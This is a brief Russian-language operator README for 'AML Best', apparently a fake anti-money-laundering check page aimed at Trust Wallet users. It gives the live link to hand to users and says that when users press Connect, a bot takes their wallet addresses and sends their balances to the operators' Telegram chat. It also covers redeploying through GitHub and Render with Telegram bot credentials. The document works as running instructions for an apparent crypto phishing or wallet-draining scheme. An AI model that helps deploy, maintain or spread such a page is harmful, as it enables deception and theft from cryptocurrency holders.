# AML Best — как пользоваться (коротко)

## Вам ничего не нужно деплоить

Cloudflare Worker **не нужен**. Всё уже на Render.

**Ссылка для пользователей (Trust Wallet):**

https://mysite2-tlgp.onrender.com/check.html

Открыть в Trust Wallet → Connect → бот сам забирает адреса и шлёт балансы в Telegram.

GitHub Pages (`iwtluxz.github.io/mysite2/check.html`) сам перенаправит на Render.

---

## Если нужно обновить код

1. Запушить в GitHub — Render сам пересоберётся.
2. В Render должны быть переменные `TELEGRAM_BOT_TOKEN` и `TELEGRAM_ADMIN_CHAT_IDS` (у вас уже были).

Проверка: https://mysite2-tlgp.onrender.com/api/health

---

## Подробная документация

См. [README.md](README.md). Папку `worker/` можно игнорировать.
